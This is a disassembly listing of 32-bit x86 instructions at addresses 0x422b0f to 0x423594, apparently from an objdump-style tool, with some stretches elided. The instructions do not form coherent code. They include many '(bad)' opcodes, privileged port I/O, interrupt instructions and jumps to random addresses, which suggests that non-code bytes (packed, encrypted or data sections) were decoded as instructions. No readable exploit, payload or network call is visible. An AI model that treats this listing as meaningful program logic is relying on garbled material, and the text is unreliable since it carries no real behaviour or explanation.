  422b0f:	jmp    0x422b59
  422b11:	iret   
  422b12:	or     cl,BYTE PTR [ebx-0x6a5a4503]
  422b18:	cmp    cl,BYTE PTR [ecx-0x57]
  422b1b:	or     bh,bl
  422b1d:	fwait
  422b1e:	les    ebp,FWORD PTR [ecx+0x3f72a600]
  422b24:	es js  0x422b14
  422b27:	unpcklps xmm5,xmm6
  422b2a:	cmp    DWORD PTR [edi-0x50],ebp
  422b2d:	push   ss
  422b2e:	pushf  
  422b2f:	push   edx
  422b30:	inc    ebp
  422b31:	sub    ah,BYTE PTR [ecx+eiz*1+0x4e72a5ca]
  422b38:	popa   
  422b39:	pop    edx
  422b3a:	shl    BYTE PTR [edi],cl
  422b3c:	rcr    cl,0x44
  422b3f:	in     eax,0xc6
  422b41:	cld    
  422b42:	pop    edx
  422b43:	inc    edi
  422b44:	ds (bad) 
  422b46:	popf   
  422b47:	cmp    ebx,DWORD PTR ds:0x675c75be
  422b4d:	pop    ss
  422b4e:	xor    bh,BYTE PTR [esi+edx*2-0x50b1d639]
  422b55:	js     0x422b83
  422b57:	jnp    0x422b6a
  422b59:	xor    ecx,ebx
  422b5b:	xlat   BYTE PTR ds:[ebx]
  422b5c:	or     DWORD PTR [edx+0x471f0af0],0x32
  422b63:	xchg   ecx,eax
  422b64:	add    DWORD PTR [edi+0x3e],edi
  422b67:	mov    dh,0x9b
  422b69:	push   cs
  422b6a:	mov    bh,0x64
  422b6c:	bound  ebp,QWORD PTR [edi+0x2]
  422b6f:	call   0x9bcaf4df
  422b74:	push   ds
  422b75:	add    DWORD PTR [ecx+0x4d],eax
  422b78:	(bad)  [ebp+0x7b]
  422b7b:	sbb    ch,0x2
  422b7e:	scas   al,BYTE PTR es:[edi]
  422b7f:	mov    ebx,0xda79101
  422b84:	xchg   esi,eax
  422b85:	or     al,0xba
  422b87:	or     al,0x6b
  422b89:	cdq    
  422b8a:	pop    ecx
  422b8b:	add    al,0x93
  422b8d:	sar    esi,0xd2
  422b90:	sub    edx,edi
  422b92:	aam    0x53
  422b94:	xor    eax,0x954d0045
  422b99:	(bad)  [esi+edx*8]
  422b9c:	dec    eax
  422b9d:	mov    ebp,0xfc2e7421
  422ba2:	fcom   DWORD PTR [ecx+0x1b492dc8]
  422ba8:	inc    esp
  422ba9:	sbb    bh,BYTE PTR [edi-0x28]
  422bac:	(bad)  
  422bad:	aad    0x3c
  422baf:	rcr    DWORD PTR [esi],1
  422bb1:	pop    ebx
  422bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bb3:	mov    ebp,0xfe49c50d
  422bb8:	daa    
  422bb9:	pop    ecx
  422bba:	int    0xe0
  422bbc:	add    al,0x57
  422bbe:	xchg   DWORD PTR [esi+0x7bbe7f4f],edx
  422bc4:	mov    ecx,esp
  422bc6:	test   bl,0x38
  422bc9:	mov    ds:0x56a4851,al
  422bce:	xor    BYTE PTR [ecx],dh
  422bd0:	loope  0x422bbd
  422bd2:	enter  0xb941,0xac
  422bd6:	scas   al,BYTE PTR es:[edi]
  422bd7:	out    dx,al
  422bd8:	push   0x56
  422bda:	std    
  422bdb:	lds    ecx,FWORD PTR [ebp+0x6e525484]
  422be1:	pusha  
  422be2:	or     DWORD PTR [ebp+0x242f5616],0xc12bdc8d
  422bec:	sbb    eax,0x2f
	...
  422c55:	add    BYTE PTR [edi+esi*1+0x4a],al
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx+0x737e4d9c]
  422c64:	add    al,0x38
  422c66:	addr16 jne 0x422c6a
  422c69:	add    BYTE PTR [eax],al
  422c6b:	add    DWORD PTR [eax],eax
  422c6d:	add    BYTE PTR [eax+0x30ae4eb2],bl
  422c73:	icebp  
  422c74:	ds test eax,0xc76ca06c
  422c7a:	mov    dh,0xb8
  422c7c:	stc    
  422c7d:	push   edi
  422c7e:	cmp    eax,0x8256002b
  422c83:	xlat   BYTE PTR ds:[ebx]
  422c84:	mov    dh,0x4
  422c86:	jne    0x422ca8
  422c88:	clc    
  422c89:	into   
  422c8a:	jl     0x422c63
  422c8c:	fisttp DWORD PTR [edi]
  422c8e:	add    edi,DWORD PTR ds:0x86870e96
  422c94:	icebp  
  422c95:	rcr    BYTE PTR ds:0x8be0e3ad,0x7d
  422c9c:	ror    BYTE PTR [esi-0x5e],1
  422c9f:	fdecstp 
  422ca1:	jge    0x422c6f
  422ca3:	out    0xe,al
  422ca5:	sub    ecx,DWORD PTR [ebp+0x70]
  422ca8:	outs   dx,BYTE PTR ds:[esi]
  422ca9:	pop    ebp
  422caa:	nop
  422cab:	jbe    0x422c98
  422cad:	sub    BYTE PTR [edi+0x1a20d0c4],ch
  422cb3:	les    ecx,FWORD PTR [edx+0x2b]
  422cb6:	mov    bl,BYTE PTR [esi]
  422cb8:	jo     0x422ccc
  422cba:	xchg   ebp,eax
  422cbb:	call   0xd9afc876
  422cc0:	xor    al,al
  422cc2:	adc    DWORD PTR [ecx],ebx
  422cc4:	xchg   edx,eax
  422cc5:	push   eax
  422cc6:	mov    ebx,0x98d4bc6f
  422ccb:	fmul   DWORD PTR [esi]
  422ccd:	stos   BYTE PTR es:[edi],al
  422cce:	sahf   
  422ccf:	out    0x4d,eax
  422cd1:	test   DWORD PTR [eax+0x2c65bca1],0xf9ef9b05
  422cdb:	cli    
  422cdc:	xchg   DWORD PTR [eax+0x77],edi
  422cdf:	add    dh,al
  422ce1:	xlat   BYTE PTR ds:[ebx]
  422ce2:	mov    bh,0x28
  422ce4:	cld    
  422ce5:	std    
  422ce6:	je     0x422c6a
  422ce8:	les    ebp,FWORD PTR [ebx+0x7b]
  422ceb:	inc    eax
  422cec:	rcr    DWORD PTR [eax-0x4a],0x2b
  422cf0:	xchg   BYTE PTR [eax],ah
  422cf2:	xlat   BYTE PTR ds:[ebx]
  422cf3:	popa   
  422cf4:	ss jg  0x422d59
  422cf7:	cmp    BYTE PTR [ebp-0x4b],ch
  422cfa:	loope  0x422d53
  422cfc:	add    DWORD PTR [ebx+0x33],ebx
  422cff:	adc    eax,0xf8eaec00
  422d04:	cvtdq2ps xmm0,xmm7
  422d07:	xor    eax,0xbfd97271
  422d0c:	outs   dx,BYTE PTR ds:[esi]
  422d0d:	test   ah,ah
  422d0f:	xor    BYTE PTR [ebp-0x10a731b2],al
  422d15:	and    ebx,edx
  422d17:	push   esi
  422d18:	cwde   
  422d19:	sahf   
  422d1a:	sbb    DWORD PTR [ecx+eiz*1+0x3e],esi
  422d1e:	sti    
  422d1f:	mov    ds:0x5653726d,eax
  422d24:	jl     0x422ccc
  422d26:	pop    esp
  422d27:	dec    ebp
  422d28:	neg    ebp
  422d2a:	ror    DWORD PTR [ecx+0x1dea154d],0x79
  422d31:	fidiv  WORD PTR [edi+0x5f262fa]
  422d37:	in     al,dx
  422d38:	mov    al,ds:0x228dd5c9
  422d3d:	push   ebp
  422d3e:	gs in  al,dx
  422d40:	retf   
  422d41:	mov    bl,0x51
  422d43:	push   0x9ed8b4b1
  422d48:	inc    eax
  422d49:	(bad)  
  422d4a:	dec    esi
  422d4b:	(bad)  
  422d4c:	xchg   ecx,eax
  422d4d:	aas    
  422d4e:	leave  
  422d4f:	push   ebx
  422d50:	sbb    dl,BYTE PTR [ebp+0x529b8c9e]
  422d56:	test   DWORD PTR [esi-0x4c1ca1f],0x3c55e291
  422d60:	or     DWORD PTR [esi+0x158330e0],0xbf87af2
  422d6a:	jbe    0x422dc0
  422d6c:	or     dl,dl
	...
  422dd6:	mov    edi,0x626d60bd
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    eax,DWORD PTR [edx+0x67c641e7]
  422de7:	jbe    0x422dea
  422de9:	add    BYTE PTR [eax],al
  422deb:	add    DWORD PTR [eax],eax
  422ded:	add    BYTE PTR [ebx+0x72],ah
  422df0:	xchg   DWORD PTR [ebx+0x4e],ecx
  422df3:	and    dh,BYTE PTR [edi-0x11]
  422df6:	cmc    
  422df7:	fimul  WORD PTR [eax]
  422df9:	hlt    
  422dfa:	pop    edi
  422dfb:	adc    ch,BYTE PTR [edx-0x78b4b411]
  422e01:	mov    bh,BYTE PTR [eax]
  422e03:	xchg   ebx,eax
  422e04:	fimul  WORD PTR [eax]
  422e06:	shl    BYTE PTR [edi+edx*2-0x683b9b46],cl
  422e0d:	jb     0x422e46
  422e0f:	jno    0x422df0
  422e11:	dec    edx
  422e12:	mov    ecx,0x95f12be
  422e17:	imul   eax,DWORD PTR [edi],0xffffff90
  422e1a:	fs (bad) 
  422e1c:	fstp   QWORD PTR [ebp+0x5b]
  422e1f:	inc    eax
  422e20:	sub    eax,0xbab01dec
  422e25:	mov    ch,0x37
  422e27:	dec    ebp
  422e28:	xchg   edi,eax
  422e29:	xchg   edx,eax
  422e2a:	push   esp
  422e2b:	and    BYTE PTR [edi+0x1914d3bb],bh
  422e31:	push   ebx
  422e32:	js     0x422e37
  422e34:	popf   
  422e35:	adc    DWORD PTR [ebp-0x42],edi
  422e38:	mov    DWORD PTR [eax-0x35],ecx
  422e3b:	inc    ebx
  422e3c:	imul   ebp,DWORD PTR ds:0x3e9fb68d,0xecb207d8
  422e46:	lods   eax,DWORD PTR ds:[esi]
  422e47:	into   
  422e48:	pop    eax
  422e49:	push   edx
  422e4a:	sbb    esi,esp
  422e4c:	ret    
  422e4d:	les    ebx,FWORD PTR [eax-0x136de7f7]
  422e53:	mov    al,BYTE PTR [esi+0x62bb732c]
  422e59:	vmovlps xmm3,xmm3,QWORD PTR ds:0x8e69bb96
  422e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e62:	lea    ebx,[edx]
  422e64:	fadd   DWORD PTR [eax-0x4e]
  422e67:	loope  0x422e8b
  422e69:	shl    DWORD PTR [ecx-0x7d1ae2e2],cl
  422e6f:	jo     0x422e4d
  422e71:	cmp    al,0xf6
  422e73:	mov    edx,0xa9f29f0a
  422e78:	mov    DWORD PTR [esi+edi*1],edi
  422e7b:	and    DWORD PTR ds:0x6e44b879,esi
  422e81:	sar    DWORD PTR [esi+0x3b9e8a63],1
  422e87:	sub    cl,BYTE PTR ds:0x354e8162
  422e8d:	dec    eax
  422e8e:	hlt    
  422e8f:	xchg   edi,eax
  422e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e91:	xlat   BYTE PTR ds:[ebx]
  422e92:	push   0xc1710016
  422e97:	add    ah,dl
  422e99:	les    esp,FWORD PTR [edx+0x53e3d691]
  422e9f:	scas   eax,DWORD PTR es:[edi]
  422ea0:	std    
  422ea1:	xor    edi,DWORD PTR [eax-0x20]
  422ea4:	mov    esi,0xe5982440
  422ea9:	jnp    0x422ed5
  422eab:	(bad)  
  422eac:	js     0x422eca
  422eae:	gs mov dl,0xae
  422eb1:	push   edi
  422eb2:	adc    al,BYTE PTR [ecx+0x25f55b6b]
  422eb8:	popa   
  422eb9:	pop    eax
  422eba:	cmp    DWORD PTR [ebx-0x75cae966],edx
  422ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ec1:	shr    DWORD PTR [esi+0x2c],0x7f
  422ec5:	mov    esp,esp
  422ec7:	push   ds
  422ec8:	xor    dl,0x19
  422ecb:	out    dx,eax
  422ecc:	push   esi
  422ecd:	sub    DWORD PTR [ebp+0x7d],ecx
  422ed0:	imul   ecx,ebp,0xec49e841
  422ed6:	inc    eax
  422ed7:	dec    ebp
  422ed8:	jp     0x422ee4
  422eda:	or     bh,ch
  422edc:	mov    WORD PTR [ecx-0x1e],ss
  422edf:	hlt    
  422ee0:	fs push esi
  422ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ee3:	icebp  
  422ee4:	arpl   WORD PTR [edi+eax*1-0x62],di
  422ee8:	push   0xf13c0500
  422eed:	xchg   ebx,eax
	...
  422f56:	adc    DWORD PTR [ebp-0x78],0x19
  422f5a:	(bad)  
  422f5c:	xchg   ebx,eax
  422f5d:	fisttp WORD PTR [eax]
  422f5f:	mov    eax,0x6195ca33
  422f64:	ds je  0x422fce
  422f67:	ja     0x422f6a
  422f69:	add    BYTE PTR [eax],al
  422f6b:	add    DWORD PTR [eax],eax
  422f6d:	add    dl,bh
  422f6f:	adc    esi,esp
  422f71:	add    BYTE PTR [edi],ah
  422f73:	dec    dx
  422f76:	repnz push ecx
  422f78:	loop   0x422f16
  422f7a:	fstp   DWORD PTR [edi]
  422f7c:	mov    esp,0x91ffc272
  422f81:	cmp    cl,BYTE PTR [edi]
  422f83:	xlat   BYTE PTR ds:[ebx]
  422f84:	lods   al,BYTE PTR ds:[esi]
  422f85:	int3   
  422f86:	(bad)  
  422f87:	sub    eax,0xb8435bc1
  422f8c:	rcr    DWORD PTR [ebp-0x19],1
  422f8f:	leave  
  422f90:	mov    ds,WORD PTR [edx-0x73]
  422f93:	jle    0x422f70
  422f95:	mov    eax,0x208439a4
  422f9a:	push   esp
  422f9b:	pop    eax
  422f9c:	test   ch,ch
  422f9e:	call   FWORD PTR [ecx]
  422fa0:	mov    cs,WORD PTR [edx+eax*1-0x55]
  422fa4:	sub    dl,bl
  422fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fa7:	mov    dl,0xb7
  422fa9:	cmc    
  422faa:	sbb    al,0xfc
  422fac:	or     esp,DWORD PTR [ebp-0x519fd4dd]
  422fb2:	lods   eax,DWORD PTR ds:[esi]
  422fb3:	jnp    0x422fc9
  422fb5:	mov    ebp,0x45ad93c2
  422fba:	cld    
  422fbb:	and    eax,0x77958494
  422fc0:	in     al,dx
  422fc1:	xchg   BYTE PTR [edx],bl
  422fc3:	dec    edx
  422fc4:	int    0x1e
  422fc6:	dec    edx
  422fc7:	xchg   DWORD PTR [ebp+ebp*4-0x60],esi
  422fcb:	fst    QWORD PTR [eax-0x46]
  422fce:	sbb    bh,BYTE PTR [edi+esi*2]
  422fd1:	adc    ah,BYTE PTR [edi]
  422fd3:	inc    esi
  422fd4:	and    esp,DWORD PTR [edx-0x57354817]
  422fda:	imul   esi,DWORD PTR [edi],0x8c1e687a
  422fe0:	icebp  
  422fe1:	test   WORD PTR [ecx+0x435b673c],0xc7dd
  422fea:	sub    eax,0xc2234f52
  422fef:	lods   eax,DWORD PTR ds:[esi]
  422ff0:	out    0x9c,al
  422ff2:	ja     0x42306b
  422ff4:	or     dh,BYTE PTR [esi]
  422ff6:	cwde   
  422ff7:	mov    esi,0x3102f489
  422ffc:	leave  
  422ffd:	(bad)  
  422ffe:	cmp    al,0xf7
  423000:	pop    edx
  423001:	ins    DWORD PTR es:[edi],dx
  423002:	and    eax,0xdf4a3c9c
  423007:	pop    edx
  423008:	ja     0x422f98
  42300a:	or     eax,edx
  42300c:	pop    edx
  42300d:	adc    BYTE PTR [eax+ebp*8-0x124a0714],al
  423014:	or     al,0xcd
  423016:	call   0xbdd8:0x3aa03b52
  42301d:	xchg   edx,eax
  42301e:	rol    BYTE PTR [ebx+0x1b],0x16
  423022:	stos   BYTE PTR es:[edi],al
  423023:	sbb    eax,0x393e4b1e
  423028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423029:	iret   
  42302a:	jns    0x423077
  42302c:	fs cld 
  42302e:	mov    eax,ds:0x83fdb641
  423033:	push   0x3ee155af
  423038:	adc    DWORD PTR ds:0x641296a8,eax
  42303e:	and    al,0xa1
  423040:	push   edx
  423041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423042:	imul   BYTE PTR [edx-0x76]
  423045:	xchg   esi,eax
  423046:	mov    ecx,0x6472b7ac
  42304b:	lock rcl DWORD PTR [edi],1
  42304e:	fisubr DWORD PTR [ebp+0x7b]
  423051:	mov    edi,0x1ffbb5dd
  423056:	jbe    0x42303a
  423058:	jg     0x42307c
  42305a:	fcmovnu st,st(3)
  42305c:	ins    BYTE PTR es:[edi],dx
  42305d:	jno    0x423077
  42305f:	or     DWORD PTR [eax],esp
  423061:	int    0x97
  423063:	jnp    0x42302b
  423065:	add    eax,0xd2fc6bd9
  42306a:	out    0xe3,al
  42306c:	add    BYTE PTR [edx+0x0],bh
	...
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [edx+ecx*2+0x67295439],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    BYTE PTR [eax+ebp*8+0x799215fc],cl
  4230f4:	xchg   ebp,eax
  4230f5:	std    
  4230f6:	lods   al,BYTE PTR ds:[esi]
  4230f7:	sar    BYTE PTR [eax],cl
  4230f9:	jmp    0xd7db992a
  4230fe:	rcr    cl,cl
  423100:	jnp    0x42309d
  423102:	jnp    0x423138
  423104:	aam    0xdf
  423106:	push   cs
  423107:	xor    al,0xeb
  423109:	test   al,0x9f
  42310b:	aaa    
  42310c:	rol    BYTE PTR [ebp-0xb6cbb7e],1
  423112:	add    cl,ah
  423114:	cs stos DWORD PTR es:[edi],eax
  423116:	dec    esi
  423117:	mov    WORD PTR [ebx+ebx*8-0x5b8f069d],ds
  42311e:	mov    al,ds:0x94dfc894
  423123:	xor    dh,0x6
  423126:	mov    ds:0xf01f8b6d,al
  42312b:	scas   eax,DWORD PTR es:[edi]
  42312c:	adc    eax,0x60de1074
  423131:	test   BYTE PTR [eax+0x1b1c5c5b],ch
  423137:	or     eax,0x4bb306f2
  42313c:	push   eax
  42313d:	in     eax,dx
  42313e:	xor    eax,0xd84f59
  423143:	pop    ss
  423144:	ret    
  423145:	jmp    0x42318a
  423147:	outs   dx,DWORD PTR ds:[esi]
  423148:	scas   eax,DWORD PTR es:[edi]
  423149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42314a:	ins    BYTE PTR es:[edi],dx
  42314b:	mov    dh,0xc4
  42314d:	and    ah,bh
  42314f:	enter  0x4d88,0x26
  423153:	push   0xffffff93
  423155:	aas    
  423156:	enter  0x6b1c,0x68
  42315a:	shl    DWORD PTR [ebx],1
  42315c:	jmp    0x7eb3c71
  423161:	or     ah,BYTE PTR [esi]
  423163:	sbb    eax,ebp
  423165:	mov    ?,WORD PTR [edx-0x5]
  423168:	ret    0x466d
  42316b:	and    al,0x83
  42316d:	sbb    BYTE PTR ds:0x61344cb,0xe9
  423174:	and    eax,0x3a9ab62e
  423179:	add    eax,0xf2804913
  42317e:	and    eax,0x700bba8e
  423183:	sbb    edx,DWORD PTR [bx+0x725e]
  423188:	ficomp DWORD PTR [ebx+ecx*2+0x4cd6101c]
  42318f:	jbe    0x423200
  423191:	lods   eax,DWORD PTR ds:[esi]
  423192:	pop    ds
  423193:	stos   DWORD PTR es:[edi],eax
  423194:	out    0x66,eax
  423196:	in     al,0xd5
  423198:	xor    ebx,DWORD PTR [edi+0x52]
  42319b:	jge    0x4231ee
  42319d:	cmp    esi,edx
  42319f:	sbb    esi,DWORD PTR [eax+0x29]
  4231a2:	push   cs
  4231a3:	in     al,dx
  4231a4:	sub    ch,ah
  4231a6:	and    DWORD PTR es:[eax+0x67405823],ebx
  4231ad:	(bad)  
  4231ae:	mov    eax,ds:0x122ea0cc
  4231b3:	cli    
  4231b4:	mov    ds,WORD PTR [esi]
  4231b6:	pushf  
  4231b7:	popf   
  4231b8:	xor    eax,DWORD PTR [eax]
  4231ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231bb:	and    al,0x56
  4231bd:	mov    esp,0xeceb4b88
  4231c2:	test   eax,0x2ab3f276
  4231c7:	cmp    ebp,DWORD PTR [ebp-0x1ab4f2d5]
  4231cd:	and    DWORD PTR [esi],esi
  4231cf:	(bad)  
  4231d0:	dec    esi
  4231d1:	sbb    eax,0xd3c5c269
  4231d6:	hlt    
  4231d7:	(bad)  
  4231d8:	aaa    
  4231d9:	pop    edx
  4231da:	pop    edx
  4231db:	adc    dh,BYTE PTR [esi-0x44]
  4231de:	jbe    0x423176
  4231e0:	xlat   BYTE PTR ds:[ebx]
  4231e1:	cmp    BYTE PTR [ecx],dl
  4231e3:	cli    
  4231e4:	int    0x16
  4231e6:	mov    bl,0x5b
  4231e8:	push   0x55b7c3b
  4231ed:	inc    ebx
	...
  423256:	jns    0x423249
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx+0x1190dbc3],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    ah,al
  42326f:	push   es
  423270:	add    al,0xad
  423272:	cli    
  423273:	add    BYTE PTR [ebp+0x5],dl
  423276:	cmovl  eax,DWORD PTR [ecx]
  423279:	push   ds
  42327a:	call   0xd3403f28
  42327f:	inc    esi
  423280:	jl     0x423282
  423282:	fisttp QWORD PTR [edx-0x28da6f32]
  423288:	retf   
  423289:	data16 scas al,BYTE PTR es:[edi]
  42328b:	sti    
  42328c:	sub    BYTE PTR [ebp+0x70fa18a0],0x46
  423293:	iret   
  423294:	mov    ebx,0xfd830d4e
  423299:	mov    dl,0x80
  42329b:	mov    ah,0xaf
  42329d:	dec    esp
  42329e:	dec    edx
  42329f:	or     cl,dh
  4232a1:	pop    esi
  4232a2:	push   ecx
  4232a3:	sub    BYTE PTR [eax],0x6e
  4232a6:	pop    edx
  4232a7:	pushf  
  4232a8:	ret    0xb9f9
  4232ab:	push   cs
  4232ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ad:	into   
  4232ae:	mov    BYTE PTR [ecx+ebx*1-0x53fca27a],ch
  4232b5:	not    eax
  4232b7:	sbb    eax,0xfd827f18
  4232bc:	imul   DWORD PTR [ebx]
  4232be:	cdq    
  4232bf:	dec    edi
  4232c0:	xchg   esi,eax
  4232c1:	xchg   DWORD PTR [edx],esi
  4232c3:	test   BYTE PTR [esi],0x1c
  4232c6:	push   es
  4232c7:	fnstcw WORD PTR [edx]
  4232c9:	outs   dx,DWORD PTR ds:[esi]
  4232ca:	mov    eax,0x10f9e728
  4232cf:	inc    edx
  4232d0:	pusha  
  4232d1:	and    eax,0x6a60273a
  4232d6:	es pop ebp
  4232d8:	push   eax
  4232d9:	mov    al,0xbf
  4232db:	dec    ebx
  4232dc:	dec    edx
  4232dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232de:	pop    edx
  4232df:	(bad)  
  4232e0:	xchg   esi,eax
  4232e1:	hlt    
  4232e2:	inc    ebp
  4232e3:	out    dx,al
  4232e4:	fnstenv [edx-0x73]
  4232e7:	(bad)  
  4232e8:	pusha  
  4232e9:	sbb    al,BYTE PTR [ecx]
  4232eb:	rcr    ebx,0x5e
  4232ee:	cmp    ebx,DWORD PTR [ebp-0x80]
  4232f1:	gs jmp 0x42336a
  4232f4:	add    ah,cl
  4232f6:	cli    
  4232f7:	or     BYTE PTR [edx+0x750a8517],bh
  4232fd:	xor    al,0xf7
  4232ff:	cmp    BYTE PTR [edx-0x80],ch
  423302:	hlt    
  423303:	fwait
  423304:	dec    ebx
  423305:	pop    ebp
  423306:	and    al,al
  423308:	stos   BYTE PTR es:[edi],al
  423309:	repnz adc DWORD PTR [ebp-0x72],0x4006a96d
  423311:	inc    eax
  423312:	xchg   esi,eax
  423313:	xchg   BYTE PTR [ebx],dl
  423315:	dec    esi
  423316:	add    eax,0x28b9bf7c
  42331b:	cmp    bh,BYTE PTR [eax+0x35]
  42331e:	clc    
  42331f:	aaa    
  423320:	pop    ebp
  423321:	push   ds
  423322:	int    0x51
  423324:	xor    BYTE PTR [ebx+0x6b],dh
  423327:	loope  0x423364
  423329:	add    edi,DWORD PTR ds:0x3fb0252
  42332f:	popa   
  423330:	ret    0xfada
  423333:	loopne 0x42330d
  423335:	dec    edi
  423336:	ins    BYTE PTR es:[edi],dx
  423337:	int    0x61
  423339:	ds pusha 
  42333b:	stc    
  42333c:	jbe    0x423357
  42333e:	mov    edi,0x8344e625
  423343:	loop   0x423333
  423345:	adc    eax,0xc43ce735
  42334a:	push   ebx
  42334b:	in     eax,dx
  42334c:	dec    ecx
  42334d:	or     ecx,DWORD PTR [eax]
  42334f:	(bad)  
  423350:	xchg   bp,ax
  423352:	pop    eax
  423353:	in     eax,0x27
  423355:	test   DWORD PTR [edx*1+0x165a1a24],esi
  42335c:	sub    eax,0x4368cd64
  423361:	jp     0x423382
  423363:	ror    esp,cl
  423365:	cli    
  423366:	cmp    ah,BYTE PTR [esi+ecx*8+0x7b]
  42336a:	das    
  42336b:	std    
  42336c:	mov    esi,DWORD PTR [eax]
	...
  4233d6:	clc    
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0xe1fd0f44
  4233e4:	xor    al,0xdc
  4233e6:	addr16 jp 0x4233ea
  4233e9:	add    BYTE PTR [eax],al
  4233eb:	add    DWORD PTR [eax],eax
  4233ed:	add    BYTE PTR [esi-0x47],al
  4233f0:	push   ds
  4233f1:	inc    esi
  4233f2:	push   es
  4233f3:	mov    eax,ds:0x5ac44dc7
  4233f8:	add    esi,DWORD PTR [ebx]
  4233fa:	in     eax,dx
  4233fb:	in     al,dx
  4233fc:	or     DWORD PTR [edx-0x3aafadc7],edi
  423402:	xlat   BYTE PTR ds:[ebx]
  423403:	in     eax,0xe3
  423405:	jnp    0x42347e
  423407:	add    ch,dl
  423409:	stos   DWORD PTR es:[edi],eax
  42340a:	and    dh,0x32
  42340d:	pop    es
  42340e:	push   ebp
  42340f:	sub    edx,DWORD PTR [ebx+edx*4-0x49779544]
  423416:	sbb    bh,BYTE PTR [ebp+0xdc2e5f7]
  42341c:	ds mov ebx,0xd8af5818
  423422:	pop    esp
  423423:	or     ecx,DWORD PTR [edi-0x76002abf]
  423429:	fsubrp st(5),st
  42342b:	loope  0x42340d
  42342d:	or     BYTE PTR [esi-0x1a],0xd0
  423431:	imul   esp,DWORD PTR [ebx],0xffffff89
  423434:	shr    BYTE PTR [edi],cl
  423436:	ins    BYTE PTR es:[edi],dx
  423437:	fistp  DWORD PTR [eax-0x5e76123c]
  42343d:	pop    ebx
  42343e:	mov    edi,0x2558aefa
  423443:	pushf  
  423444:	cdq    
  423445:	inc    eax
  423446:	ins    BYTE PTR es:[edi],dx
  423447:	dec    edx
  423448:	pushf  
  423449:	fsubr  DWORD PTR [edi+0x28]
  42344c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42344d:	stos   BYTE PTR es:[edi],al
  42344e:	(bad)  
  42344f:	(bad)  
  423450:	in     eax,dx
  423451:	in     eax,dx
  423452:	sub    eax,0xb6bf999e
  423457:	sub    ebp,DWORD PTR [edi+esi*4+0x19]
  42345b:	test   DWORD PTR [ebp+0x1dc4d000],0xb499293b
  423465:	sub    al,0xe3
  423467:	pop    ss
  423468:	ss xor esi,edi
  42346b:	push   edx
  42346c:	mov    edx,0x95691778
  423471:	pop    esp
  423472:	(bad)  
  423473:	jae    0x423476
  423475:	je     0x42347a
  423477:	dec    eax
  423478:	cmc    
  423479:	dec    edi
  42347a:	add    dh,bh
  42347c:	ds pop esi
  42347e:	out    dx,eax
  42347f:	push   0xd7c40d79
  423484:	pop    ss
  423485:	xor    DWORD PTR [ebx+0x4a8ee28d],0xfb2e955f
  42348f:	mov    dh,0x42
  423491:	sub    al,0xc7
  423493:	inc    ebx
  423494:	jae    0x4234f8
  423496:	xor    BYTE PTR [ebx-0x57],bl
  423499:	and    al,BYTE PTR ds:0xfb3d81b2
  42349f:	in     eax,dx
  4234a0:	pop    ds
  4234a1:	jle    0x42347d
  4234a3:	in     al,dx
  4234a4:	loope  0x4234b4
  4234a6:	jl     0x423431
  4234a8:	je     0x42342a
  4234aa:	jecxz  0x4234ab
  4234ac:	imul   ebp,edi,0x68
  4234af:	mov    ebx,0xe58fbc2e
  4234b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234b5:	cmp    bh,BYTE PTR [edi+0x7a]
  4234b8:	icebp  
  4234b9:	call   0xdc6be926
  4234be:	ret    0x90e0
  4234c1:	dec    eax
  4234c2:	fistp  QWORD PTR [edi+0x2568193a]
  4234c8:	or     BYTE PTR [ecx+0x49],0x8
  4234cc:	icebp  
  4234cd:	pop    ds
  4234ce:	inc    edx
  4234cf:	imul   ecx,DWORD PTR [ebx-0x64],0x1f73add1
  4234d6:	add    BYTE PTR [ebx+0x59],dh
  4234d9:	and    DWORD PTR [edx],0x749fd7eb
  4234df:	xchg   DWORD PTR [ecx+0x9],ebp
  4234e2:	iret   
  4234e3:	add    al,0x23
  4234e5:	(bad)  
  4234e6:	mov    ah,0x3d
  4234e8:	neg    BYTE PTR [esi+0x57]
  4234eb:	mov    edi,0xab7f
	...
  423554:	add    BYTE PTR [eax],al
  423556:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42355d:	mov    edi,0x1fadf467
  423562:	add    eax,0x67bb8416
  423567:	jnp    0x42356a
  423569:	add    BYTE PTR [eax],al
  42356b:	add    DWORD PTR [eax],eax
  42356d:	add    BYTE PTR [ebx+0x5c],dh
  423570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423571:	cdq    
  423572:	aad    0x4f
  423574:	jmp    0x815f43e7
  423579:	adc    BYTE PTR [eax-0x6c006260],bl
  42357f:	push   ss
  423580:	out    dx,eax
  423581:	mov    esp,0x802931a2
  423586:	cmp    BYTE PTR [esi],0xfb
  423589:	pop    es
  42358a:	stos   DWORD PTR es:[edi],eax
  42358b:	xchg   ecx,eax
  42358c:	mov    eax,0x7a507fa3
  423591:	shr    DWORD PTR [eax],0xe9
  423594:	inc    ebx
